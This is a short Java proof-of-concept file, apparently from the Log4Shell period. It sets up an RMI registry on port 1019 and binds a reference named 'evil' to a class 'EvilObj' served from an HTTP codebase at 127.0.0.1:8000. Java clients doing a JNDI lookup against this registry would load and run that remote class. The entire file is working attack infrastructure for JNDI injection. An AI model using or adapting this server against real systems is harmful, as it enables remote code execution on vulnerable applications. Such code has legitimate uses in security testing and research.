package cn.burningbright.poc;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * Hello world!
 * rmi server
 * @author chenguang.lin
 * @date 2021-12-15
 */
public class App {

    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1019);
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1019);
        ReferenceWrapper wrapper = new ReferenceWrapper(
                new Reference("EvilObj", "EvilObj", "http://127.0.0.1:8000/"));
        registry.bind("evil", wrapper);
    }

}
